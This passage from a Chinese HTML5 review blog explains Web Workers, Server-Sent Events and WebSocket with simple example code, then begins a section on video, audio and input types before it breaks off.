worker提供的一种简单的方法来为web内容在后台线程中运行脚本，这些线程在执行任务的过程中并不会干扰用户界面！</p><p>当在 HTML 页面中执行脚本时，页面的状态是不可响应的，直到脚本已完成。<br>web worker 是运行在后台的 JavaScript，独立于其他脚本，不会影响页面的性能。您可以继续做任何愿意做的事情：点击、选取内容等等，而此时 web worker 在后台运行。</p><h3 id="5-1-实例"><a href="#5-1-实例" class="headerlink" title="5.1 实例"></a>5.1 实例</h3><p>一个简单的 web worker，在后台计数：<br>demo_workers.js 文件代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var i=0;<br><br>function timedCount()<br>&#123;<br>    i=i+1;<br>    postMessage(i);<br>    setTimeout(&quot;timedCount()&quot;,500);<br>&#125;<br><br>timedCount(); <br></code></pre></div></td></tr></table></figure><p>完整实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>计数： <span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;result&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;startWorker()&quot;</span>&gt;</span>开始工作<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;stopWorker()&quot;</span>&gt;</span>停止工作<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>注意：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span> Internet Explorer 9 及更早 IE 版本浏览器不支持 Web Workers.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> w;</span><br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">startWorker</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(Worker) !== <span class="hljs-string">&quot;undefined&quot;</span>) &#123;</span><br><span class="javascript">        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(w) == <span class="hljs-string">&quot;undefined&quot;</span>) &#123;</span><br><span class="javascript">            w = <span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;/statics/demosource/demo_workers.js&quot;</span>);</span><br>        &#125;<br><span class="javascript">        w.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) </span>&#123;</span><br><span class="javascript">            <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;result&quot;</span>).innerHTML = event.data;</span><br>        &#125;;<br><span class="javascript">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="javascript">        <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;result&quot;</span>).innerHTML = <span class="hljs-string">&quot;抱歉，你的浏览器不支持 Web Workers...&quot;</span>;</span><br>    &#125;<br>&#125;<br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stopWorker</span>(<span class="hljs-params"></span>) </span>&#123; </span><br>    w.terminate();<br><span class="javascript">    w = <span class="hljs-literal">undefined</span>;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-2-检测浏览器是否支持-Web-Worker"><a href="#5-2-检测浏览器是否支持-Web-Worker" class="headerlink" title="5.2 检测浏览器是否支持 Web Worker"></a>5.2 检测浏览器是否支持 Web Worker</h3><p>在创建 web worker 之前，应该检测用户的浏览器是否支持它：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if(typeof(Worker)!==&quot;undefined&quot;)<br>  &#123;<br>  // 是的! Web worker 支持!<br>  // 一些代码.....<br>  &#125;<br>else<br>  &#123;<br>  // //抱歉! Web Worker 不支持<br>  &#125; <br></code></pre></div></td></tr></table></figure><p>必须先检测才能保证接下来可以顺利操作 web worker！</p><h3 id="5-3-创建-web-worker-文件"><a href="#5-3-创建-web-worker-文件" class="headerlink" title="5.3 创建 web worker 文件"></a>5.3 创建 web worker 文件</h3><p>在一个外部 JavaScript 中创建我们的 web worker。在这里，我们创建了计数脚本。该脚本存储于 “demo_workers.js” 文件中：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var i=0;<br><br>function timedCount()<br>&#123;<br>i=i+1;<br>postMessage(i);<br>setTimeout(&quot;timedCount()&quot;,500);<br>&#125;<br><br>timedCount(); <br></code></pre></div></td></tr></table></figure><p>以上代码中重要的部分是 postMessage() 方法 - 它用于向 HTML 页面传回一段消息。<br>web worker 通常不用于如此简单的脚本，而是用于更耗费 CPU 资源的任务。</p><h3 id="5-4-创建-Web-Worker-对象"><a href="#5-4-创建-Web-Worker-对象" class="headerlink" title="5.4 创建 Web Worker 对象"></a>5.4 创建 Web Worker 对象</h3><p>已经有了 web worker 文件，现在需要从 HTML 页面调用它。<br>下面的代码检测是否存在 worker，如果不存在，- 就会创建一个新的 web worker 对象，然后运行 “demo_workers.js” 中的代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if(typeof(w)==&quot;undefined&quot;)<br>  &#123;<br>  w=new Worker(&quot;demo_workers.js&quot;);<br>  &#125;<br></code></pre></div></td></tr></table></figure><p>然后就可以从 web worker 发送和接收消息了。</p><p>向 web worker 添加一个 “onmessage” 事件监听器：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">w.onmessage=function(event)&#123;<br>document.getElementById(&quot;result&quot;).innerHTML=event.data;<br>&#125;; <br></code></pre></div></td></tr></table></figure><p>当 web worker 传递消息时，会执行事件监听器中的代码。event.data 中存有来自 event.data 的数据。</p><h3 id="5-5-终止-Web-Worker"><a href="#5-5-终止-Web-Worker" class="headerlink" title="5.5 终止 Web Worker"></a>5.5 终止 Web Worker</h3><p>创建 web worker 对象后，它会继续监听消息（即使在外部脚本完成之后）直到其被终止为止。如需终止 web worker，并释放浏览器/计算机资源，使用 terminate() 方法：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">w.terminate(); <br></code></pre></div></td></tr></table></figure><h3 id="5-6-完整实例"><a href="#5-6-完整实例" class="headerlink" title="5.6 完整实例"></a>5.6 完整实例</h3><p>已经有了 .js 文件中的 Worker 代码。下面是 HTML 页面的代码：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Count numbers: <span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;result&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;startWorker()&quot;</span>&gt;</span>Start Worker<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;stopWorker()&quot;</span>&gt;</span>Stop Worker<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript"><span class="hljs-keyword">var</span> w;</span><br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">startWorker</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(Worker)!==<span class="hljs-string">&quot;undefined&quot;</span>)</span><br>&#123;<br><span class="javascript">  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(w)==<span class="hljs-string">&quot;undefined&quot;</span>)</span><br>    &#123;<br><span class="javascript">    w=<span class="hljs-keyword">new</span> Worker(<span class="hljs-string">&quot;demo_workers.js&quot;</span>);</span><br>    &#125;<br><span class="javascript">  w.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) </span>&#123;</span><br><span class="javascript">    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;result&quot;</span>).innerHTML=event.data;</span><br>  &#125;;<br>&#125;<br><span class="javascript"><span class="hljs-keyword">else</span></span><br>&#123;<br><span class="javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;result&quot;</span>).innerHTML=<span class="hljs-string">&quot;Sorry, your browser does not support Web Workers...&quot;</span>;</span><br>&#125;<br>&#125;<br><br><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stopWorker</span>(<span class="hljs-params"></span>)</span>&#123;</span><br>w.terminate();<br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></div></td></tr></table></figure><h3 id="5-7-Web-Workers-和-DOM"><a href="#5-7-Web-Workers-和-DOM" class="headerlink" title="5.7 Web Workers 和 DOM"></a>5.7 Web Workers 和 DOM</h3><p>由于 web worker 位于外部文件中，它们无法访问下例 JavaScript 对象：</p><ul><li>window 对象</li><li>document 对象</li><li>parent 对象</li></ul><h2 id="6-服务器发送事件-Server-Sent-Events-SSE"><a href="#6-服务器发送事件-Server-Sent-Events-SSE" class="headerlink" title="6.服务器发送事件(Server-Sent Events) SSE"></a>6.服务器发送事件(Server-Sent Events) SSE</h2><p>服务器发送事件（Server-sent Events）是基于 WebSocket 协议的一种服务器向客户端发送事件和数据的单向通讯。HTML5 服务器发送事件（server-sent event）允许网页获得来自服务器的更新。</p><h3 id="6-1-Server-Sent-事件-单向消息传递"><a href="#6-1-Server-Sent-事件-单向消息传递" class="headerlink" title="6.1 Server-Sent 事件 - 单向消息传递"></a>6.1 Server-Sent 事件 - 单向消息传递</h3><p>Server-Sent 事件指的是网页自动获取来自服务器的更新。</p><p>以前也可能做到这一点，前提是网页不得不询问是否有可用的更新。通过服务器发送事件，更新能够自动到达。</p><p>例子：Facebook/Twitter 更新、估价更新、新的博文、赛事结果等。</p><h3 id="6-2-接收-Server-Sent-事件通知"><a href="#6-2-接收-Server-Sent-事件通知" class="headerlink" title="6.2 接收 Server-Sent 事件通知"></a>6.2 接收 Server-Sent 事件通知</h3><p>EventSource 对象用于接收服务器发送事件通知：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var source=new EventSource(&quot;demo_sse.php&quot;);<br>source.onmessage=function(event)&#123;<br>  document.getElementById(&quot;result&quot;).innerHTML+=event.data + &quot;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>&quot;;<br>  &#125;;<br></code></pre></div></td></tr></table></figure><p>解析：</p><ul><li><p>创建一个新的 EventSource 对象，然后规定发送更新的页面的 URL（本例中是 “demo_sse.php”）</p></li><li><p>每接收到一次更新，就会发生 onmessage 事件</p></li><li><p>当 onmessage 事件发生时，把已接收的数据推入 id 为 “result” 的元素中</p></li></ul><h3 id="6-3-检测-Server-Sent-事件支持"><a href="#6-3-检测-Server-Sent-事件支持" class="headerlink" title="6.3 检测 Server-Sent 事件支持"></a>6.3 检测 Server-Sent 事件支持</h3><p>检测服务器发送事件的浏览器支持情况：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if(typeof(EventSource)!==&quot;undefined&quot;)<br>   &#123;<br>   // 浏览器支持 Server-Sent<br>   // 一些代码.....<br>   &#125;<br> else<br>   &#123;<br>   // 浏览器不支持 Server-Sent..<br>   &#125;<br></code></pre></div></td></tr></table></figure><h3 id="6-4-服务器端代码实例"><a href="#6-4-服务器端代码实例" class="headerlink" title="6.4 服务器端代码实例"></a>6.4 服务器端代码实例</h3><p>为了让上面的例子可以运行，您还需要能够发送数据更新的服务器（比如 PHP 和 ASP）。</p><p>服务器端事件流的语法是非常简单的。把 “Content-Type” 报头设置为 “text/event-stream”。现在，就可以开始发送事件流了。<br>demo_sse.php：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&#x27;Content-Type: text/event-stream&#x27;</span>);<br> header(<span class="hljs-string">&#x27;Cache-Control: no-cache&#x27;</span>);<br><br><span class="hljs-variable">$time</span> = date(<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;data: The server time is: <span class="hljs-subst">&#123;$time&#125;</span>nn&quot;</span>;<br>flush();<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>ASP 代码 (VB) (demo_sse.asp):</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asp">&lt;%<br>Response.ContentType&#x3D;&quot;text&#x2F;event-stream&quot;<br>Response.Expires&#x3D;-1<br> Response.Write(&quot;data: &quot; &amp; now())<br>Response.Flush()<br>%&gt;<br></code></pre></div></td></tr></table></figure><p>解析：</p><ul><li><p>把报头 “Content-Type” 设置为 “text/event-stream”</p></li><li><p>规定不对页面进行缓存</p></li><li><p>输出发送日期（始终以 “data: “ 开头）</p></li><li><p>向网页刷新输出数据</p></li></ul><h3 id="6-5-EventSource-对象"><a href="#6-5-EventSource-对象" class="headerlink" title="6.5 EventSource 对象"></a>6.5 EventSource 对象</h3><p>可以使用 onmessage 事件来获取消息。还可以使用其他事件：</p><table><thead><tr><th align="center">事件</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">onopen</td><td align="center">当通往服务器的连接被打开</td></tr><tr><td align="center">onmessage</td><td align="center">当接收到消息</td></tr><tr><td align="center">onerror</td><td align="center">当发生错误</td></tr></tbody></table><h2 id="7-WebSocket"><a href="#7-WebSocket" class="headerlink" title="7.WebSocket"></a>7.WebSocket</h2><p>WebSocket是HTML5开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。</p><p>在WebSocket API中，浏览器和服务器只需要做一个握手的动作，然后，浏览器和服务器之间就形成了一条快速通道。两者之间就直接可以数据互相传送。</p><p>浏览器通过 JavaScript 向服务器发出建立 WebSocket 连接的请求，连接建立以后，客户端和服务器端就可以通过 TCP 连接直接交换数据。</p><p>当你获取 Web Socket 连接后，你可以通过 send() 方法来向服务器发送数据，并通过 onmessage 事件来接收服务器返回的数据。</p><p>以下 API 用于创建 WebSocket 对象。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var Socket = new WebSocket(url, [protocal] );<br></code></pre></div></td></tr></table></figure><p>代码中的第一个参数 url, 指定连接的 URL。第二个参数 protocol 是可选的，指定了可接受的子协议。</p><h3 id="7-1-WebSocket-属性"><a href="#7-1-WebSocket-属性" class="headerlink" title="7.1 WebSocket 属性"></a>7.1 WebSocket 属性</h3><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Socket.readyState</td><td align="center">只读属性 <strong>readyState</strong> 表示连接状态，可以是以下值：0 - 表示连接尚未建立。1 - 表示连接已建立，可以进行通信。2 - 表示连接正在进行关闭。3 - 表示连接已经关闭或者连接不能打开。</td></tr><tr><td align="center">Socket.bufferedAmount</td><td align="center">只读属性 <strong>bufferedAmount</strong> 已被 send() 放入正在队列中等待传输，但是还没有发出的 UTF-8 文本字节数。</td></tr></tbody></table><h3 id="7-2-WebSocket-事件"><a href="#7-2-WebSocket-事件" class="headerlink" title="7.2 WebSocket 事件"></a>7.2 WebSocket 事件</h3><table><thead><tr><th align="center">事件</th><th align="center">事件处理程序</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">open</td><td align="center">Socket.onopen</td><td align="center">连接建立时触发</td></tr><tr><td align="center">message</td><td align="center">Socket.onmessage</td><td align="center">客户端接收服务端数据时触发</td></tr><tr><td align="center">error</td><td align="center">Socket.onerror</td><td align="center">通信发生错误时触发</td></tr><tr><td align="center">close</td><td align="center">Socket.onclose</td><td align="center">连接关闭时触发</td></tr></tbody></table><h3 id="7-3-WebSocket-方法"><a href="#7-3-WebSocket-方法" class="headerlink" title="7.3 WebSocket 方法"></a>7.3 WebSocket 方法</h3><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Socket.send()</td><td align="center">使用连接发送数据</td></tr><tr><td align="center">Socket.close()</td><td align="center">关闭连接</td></tr></tbody></table><h3 id="7-4-WebSocket-实例"><a href="#7-4-WebSocket-实例" class="headerlink" title="7.4 WebSocket 实例"></a>7.4 WebSocket 实例</h3><p>WebSocket 协议本质上是一个基于 TCP 的协议。</p><p>为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。</p>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML5基础知识复习（三）</title>
    <link href="/2021/05/12/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2021/05/12/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML5规范于2014年10月29日由万维网联盟正式宣布，HTML是万维网最核心的超文本标记语言。万维网不等同于互联网，但它是依靠互联网运行的服务之一，万维网又简写为www，它可以实现在互联网的帮助下，访问由许多互相链接的超文本组成的系统。现代的浏览器都支持 HTML5。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-视频（video）"><a href="#1-视频（video）" class="headerlink" title="1.视频（video）"></a>1.视频（video）</h2><h3 id="1-1-使用方法"><a href="#1-1-使用方法" class="headerlink" title="1.1 使用方法"></a>1.1 使用方法</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/ogg&quot;</span>&gt;</span><br>您的浏览器不支持Video标签。<br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>&lt;video&gt; 元素提供了播放、暂停和音量控件来控制视频。</p><p>同时 &lt;video&gt; 元素也提供了 width 和 height 属性控制视频的尺寸.如果设置的高度和宽度，所需的视频空间会在页面加载时保留。。如果没有设置这些属性，浏览器不知道大小的视频，浏览器就不能再加载时保留特定的空间，页面就会根据原始视频的大小而改变。</p><p>&lt;video&gt; 与 &lt;/video&gt; 标签之间插入的内容是提供给不支持 video 元素的浏览器显示的。</p><p>&lt;video&gt; 元素支持多个 &lt;video&gt;  元素. 元素可以链接不同的视频文件。浏览器将使用第一个可识别的格式。</p><h3 id="1-2-使用DOM控制"><a href="#1-2-使用DOM控制" class="headerlink" title="1.2 使用DOM控制"></a>1.2 使用DOM控制</h3><p>HTML5 &lt;video&gt; 和 &lt;audio&gt; 元素同样拥有方法、属性和事件。</p><p>&lt;video&gt; 和 &lt;audio&gt; 元素的方法、属性和事件可以使用JavaScript进行控制.</p><p>其中的方法有用于播放、暂停以及加载等。其中的属性（比如时长、音量等）可以被读取或设置。其中的 DOM 事件能够通知您，比方说，&lt;video&gt; 元素开始播放、已暂停，已停止，等等。</p><h3 id="1-3-video标签"><a href="#1-3-video标签" class="headerlink" title="1.3 video标签"></a>1.3 video标签</h3><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&amp;lt:video&gt;</td><td align="center">定义一个视频</td></tr><tr><td align="center">&lt;source&gt;</td><td align="center">定义多种媒体资源,比如&lt;video&gt; 和&lt;audio&gt;</td></tr><tr><td align="center">&lt;track&gt;</td><td align="center">定义在媒体播放器文本轨迹</td></tr></tbody></table><h2 id="2-音频（Audio）"><a href="#2-音频（Audio）" class="headerlink" title="2.音频（Audio）"></a>2.音频（Audio）</h2><p>通过使用HTML5中的audio功能，可以实现与flash相同的功能，即回放、跳转、缓冲等。</p><h3 id="2-1-使用方法"><a href="#2-1-使用方法" class="headerlink" title="2.1 使用方法"></a>2.1 使用方法</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/ogg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.mp3&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/mpeg&quot;</span>&gt;</span><br>您的浏览器不支持 audio 元素。<br><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>control 属性供添加播放、暂停和音量控件。<br>在&lt;audio&gt; 与 &lt;/audio&gt; 之间你需要插入浏览器不支持的&lt;audio&gt;元素的提示文本 。<br>&lt;audio&gt; 元素允许使用多个 &lt;source&gt; 元素. &lt;source&gt; 元素可以链接不同的音频文件，浏览器将使用第一个支持的音频文件。</p><h3 id="2-2-audio标签"><a href="#2-2-audio标签" class="headerlink" title="2.2 audio标签"></a>2.2 audio标签</h3><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;audio&gt;</td><td align="center">定义了声音内容</td></tr><tr><td align="center">&lt;source&gt;</td><td align="center">规定了多媒体资源，可以是多个，在&lt;video&gt;与&lt;audio&gt;标签中使用</td></tr></tbody></table><h2 id="3-Input（类型）"><a href="#3-Input（类型）" class="headerlink" title="3. Input（类型）"></a>3. Input（类型）</h2><p><strong>注意：</strong>并不是所有的主流浏览器都支持新的input类型，不过已经可以在所有主流的浏览器中使用它们了。即使不被支持，仍然可以显示为常规的文本域。</p><h3 id="3-1-color"><a href="#3-1-color" class="headerlink" title="3.1 color"></a>3.1 color</h3><p>color 类型用在input字段主要用于用户选取颜色。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">选择你喜欢的颜色: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;color&quot;</span> <span class="hljs-attr">name</span>=<span 